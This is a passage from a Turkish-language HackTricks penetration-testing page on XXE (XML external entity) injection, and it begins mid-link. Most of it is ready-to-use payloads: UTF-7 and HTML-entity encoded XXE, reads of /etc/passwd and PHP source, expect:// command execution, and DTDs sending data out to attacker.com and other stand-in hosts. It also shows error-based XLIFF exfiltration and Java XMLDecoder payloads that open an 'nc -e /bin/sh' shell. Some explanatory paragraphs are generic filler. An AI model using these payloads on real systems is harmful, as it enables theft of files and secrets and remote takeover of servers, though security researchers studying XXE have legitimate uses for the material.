%2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to) kullanabilirsiniz.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Dosya:/ Protokolü Bypass

Eğer web PHP kullanıyorsa, `file:/` yerine **php wrappers**`php://filter/convert.base64-encode/resource=` kullanarak **iç dosyalara erişebilirsiniz**.

Eğer web Java kullanıyorsa [**jar: protokolünü**](xxe-xee-xml-external-entity.md#jar-protocol) kontrol edebilirsiniz.

### HTML Entiteleri

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes) adresinden alınan bir hile\
**HTML entiteleri** kullanarak bir **entiteyi içinde bir entite oluşturabilir** ve ardından bir dtd yüklemek için onu çağırabilirsiniz.\
Kullanılan **HTML Entiteleri**nin **sayısal** olması gerektiğini unutmayın (örnekteki gibi \[bu örnekte]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD örneği:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

Bu örnekte, `DOCTYPE` tanımında `foo` adında bir öğe ve `xxe` adında bir varlık tanımlanmıştır. `xxe` varlığı, `/etc/passwd` dosyasını okumak için kullanılır. `foo` öğesinde `&xxe;` varlığı çağrılarak `/etc/passwd` dosyasının içeriği alınır.
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Sargılayıcıları

### Base64

**index.php** _dosyasını çıkarın_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Harici kaynak çıkarma**

XXE saldırıları, XML dış varlık (External Entity) işleme zafiyetlerini hedef alır. Bu saldırılar, XML verilerini işleyen uygulamalarda güvenlik açıkları kullanarak harici kaynakları çıkarmayı amaçlar.

Bu saldırı türü, hedef uygulamanın XML verilerini işlerken dış varlıkları yüklemesine izin veren bir zafiyet olduğunda gerçekleştirilebilir. Saldırgan, XML verilerine özel bir dış varlık tanımlayarak, hedef uygulamanın bu dış varlığı işlemesini sağlar. Bu dış varlık, saldırganın kontrol ettiği bir kaynağa işaret edebilir, böylece saldırgan, hedef uygulamanın bu kaynağa erişmesini sağlayabilir.

XXE saldırıları, hassas verilerin çalınması, sistem kaynaklarının ifşa edilmesi veya hedef uygulamanın hizmet dışı kalması gibi ciddi sonuçlara yol açabilir. Bu nedenle, uygulama geliştiricilerinin güvenli XML işleme tekniklerini kullanmaları önemlidir.
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Uzaktan kod yürütme

**Eğer PHP "expect" modülü yüklenmişse**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

SOAP (Simple Object Access Protocol), XML tabanlı bir iletişim protokolüdür ve web servislerinde sıklıkla kullanılır. SOAP, XML mesajlarını kullanarak istemci ve sunucu arasında veri alışverişi yapar. SOAP tabanlı web servislerinde, XEE (XML External Entity) saldırıları yaygın olarak kullanılan bir zayıflıktır.

### XEE Nedir?

XML External Entity (XEE), XML tabanlı uygulamalarda bulunan bir güvenlik açığıdır. Bu saldırı türünde, saldırgan, XML dökümanında harici bir varlık (external entity) tanımlayarak, sunucunun hassas verilerini ifşa etmesini sağlar. XEE saldırıları, SOAP tabanlı web servislerinde özellikle yaygın olarak kullanılır.

### XEE Saldırıları Nasıl Gerçekleştirilir?

XEE saldırıları, XML dökümanında yer alan harici varlık tanımlamaları aracılığıyla gerçekleştirilir. Saldırgan, XML dökümanına özel bir varlık tanımlayarak, sunucunun dosya sistemine erişim sağlayabilir veya hassas verileri ifşa edebilir.

XEE saldırıları genellikle şu adımları içerir:

1. XML dökümanında harici bir varlık tanımlama.
2. Harici varlık kullanarak sunucunun dosya sistemine erişim veya hassas verilerin ifşa edilmesi.

### XEE Saldırılarının Etkileri

XEE saldırıları, başarılı bir şekilde gerçekleştirildiğinde ciddi güvenlik sorunlarına yol açabilir. Saldırgan, sunucunun dosya sistemine erişim sağlayarak, hassas verilere erişebilir veya sunucunun hizmetini engelleyebilir. Bu tür saldırılar, kullanıcıların gizli bilgilerinin ifşa edilmesine veya yetkisiz erişime neden olabilir.

### XEE Saldırılarına Karşı Korunma Yöntemleri

XEE saldırılarına karşı korunmak için aşağıdaki önlemler alınabilir:

1. Giriş doğrulama ve veri doğrulama işlemlerinin güvenli bir şekilde gerçekleştirilmesi.
2. XML dökümanlarının güvenli bir şekilde işlenmesi için güvenilir XML işleme kütüphanelerinin kullanılması.
3. Harici varlık tanımlamalarının devre dışı bırakılması veya sınırlanması.
4. Güvenlik duvarı ve güvenlik politikalarının doğru şekilde yapılandırılması.

XEE saldırılarına karşı korunmak için güvenlik açıklarının düzgün bir şekilde tespit edilmesi ve düzeltilmesi önemlidir. Bu nedenle, düzenli güvenlik testleri ve güncellemeler yapılmalıdır.
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Bu örnek, [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe) adresinden esinlenilmiştir.

XLIFF (XML Localization Interchange File Format), yerelleştirme süreçlerinde veri alışverişini standartlaştırmak için kullanılır. Bu, yerelleştirme sırasında araçlar arasında yerelleştirilebilir veri transferi için kullanılan XML tabanlı bir formattır ve CAT (Bilgisayar Destekli Çeviri) araçları için ortak bir değişim formatı olarak kullanılır.

### Kör İstek Analizi

Aşağıdaki içerikle sunucuya bir istek yapılır:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ancak, bu istek içeride bir sunucu hatası tetikler ve özellikle işaretleme bildirimleriyle ilgili bir sorunu belirtir:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Hata olmasına rağmen, Burp Collaborator'da bir vuruş kaydedilir ve bu da dış varlıkla bir şekilde etkileşim olduğunu gösterir.

Veri Dışarı Sızdırma Yoluyla Bağlantı Dışı Veri Çalma
Veri çalmak için değiştirilmiş bir istek gönderilir:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Bu yaklaşım, Kullanıcı Aracısının Java 1.8 kullanımını gösterdiğini ortaya koyar. Bu Java sürümünün bir kısıtlaması, /etc/passwd gibi yeni satır karakteri içeren dosyaların Out of Band tekniği kullanılarak alınamamasıdır.

Hata Tabanlı Veri Sızdırma
Bu kısıtlamayı aşmak için Hata Tabanlı bir yaklaşım kullanılır. DTD dosyası, bir hedef dosyadan veri içeren bir hatayı tetiklemek için aşağıdaki gibi yapılandırılır:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Sunucu bir hata ile yanıt verir, önemli olan mevcut olmayan dosyayı yansıtarak, sunucunun belirtilen dosyaya erişmeye çalıştığını gösterir:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Hata mesajında dosyanın içeriğini dahil etmek için DTD dosyası ayarlanır:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Bu değişiklik, dosyanın içeriğinin başarılı bir şekilde dışarı sızdırılmasına yol açar, çünkü HTTP aracılığıyla gönderilen hata çıktısında yansıtılır. Bu, hassas bilgileri çıkarmak için Hem Out of Band hem de Hata Tabanlı teknikleri kullanarak başarılı bir XXE (XML External Entity) saldırısını gösterir.


## RSS - XEE

XXE zafiyetini sömürmek için geçerli bir RSS formatında XML.

### Ping back

Saldırganın sunucusuna basit bir HTTP isteği.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Dosya Okuma

Bir XXE saldırısıyla hedef sistemin bir dosyayı okumasını sağlayabilirsiniz. Bu saldırıyı gerçekleştirmek için, hedef sisteme bir XML dökümanı göndermeniz gerekmektedir. XML dökümanında, hedefin okumasını istediğiniz dosyanın yolunu belirtmelisiniz.

Örneğin, aşağıdaki XML dökümanını hedef sisteme göndererek `/etc/passwd` dosyasını okumasını sağlayabilirsiniz:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

Hedef sistem bu XML dökümanını işlerken, `xxe` entity'sini `file:///etc/passwd` dosyasının içeriğiyle değiştirir ve sonuç olarak `/etc/passwd` dosyasının içeriğini size döner.

Bu saldırı tekniği, hedef sistemin hassas bilgilerini elde etmek için kullanılabilir. Ancak, bazı hedef sistemler XXE saldırılarına karşı korunmak için önlemler alır. Bu nedenle, saldırı yapmadan önce hedef sistemin bu tür bir saldırıya karşı savunmasız olup olmadığını kontrol etmek önemlidir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Kaynak kodunu oku

PHP base64 filtresi kullanarak
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder, bir XML mesajına dayalı olarak nesneler oluşturan bir Java sınıfıdır. Kötü niyetli bir kullanıcı, bir uygulamanın **readObject** yöntemine keyfi veri kullanmasını sağlayabilirse, sunucuda anında kod yürütme yetkisi elde eder.

### Runtime().exec() Kullanımı
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

ProcessBuilder, bir işlem oluşturmak ve yürütmek için kullanılan bir sınıftır. Bu sınıf, harici bir işlemi başlatmak için kullanılabilir ve işlemle etkileşimde bulunmak için gerekli olan giriş ve çıkış akışlarını yönetir.

ProcessBuilder, bir komut veya komut dosyası adı ve gerekli argümanlarla birlikte bir işlem oluşturmak için kullanılır. Ardından, işlemi başlatmak için `start()` yöntemi çağrılır.

İşlem başlatıldığında, işlemle etkileşimde bulunmak için `Process` sınıfının yöntemlerini kullanabilirsiniz. Örneğin, işlemi sonlandırmak için `destroy()` yöntemini kullanabilir veya işlem çıktısını almak için `getInputStream()` veya `getErrorStream()` yöntemlerini kullanabilirsiniz.

ProcessBuilder, bir işlemi başlatmak için kullanılan güvenli bir yöntemdir. Ancak, kötü niyetli kullanıcılar tarafından kötüye kullanılabilir. Özellikle, dışarıdan gelen verileri işlem argümanları olarak kullanırken dikkatli olmak önemlidir. Kötü niyetli kullanıcılar, XML dış etkileşimli varlıklarını (XXE) kullanarak hassas verileri sızdırabilir veya sistemdeki dosyaları okuyabilirler.

Bu nedenle, güvenlik açısından, dışarıdan gelen verileri işlem argümanları olarak kullanırken dikkatli olmalı ve gerekirse girişleri doğrulamalı veya sınırlamalıyız. Ayrıca, güvenlik duvarları ve filtreler gibi ek önlemler almak da önemlidir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Araçlar

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Referanslar

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
* Kendi harici DTD kullanarak HTTP üzerinden bilgi çıkarma: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
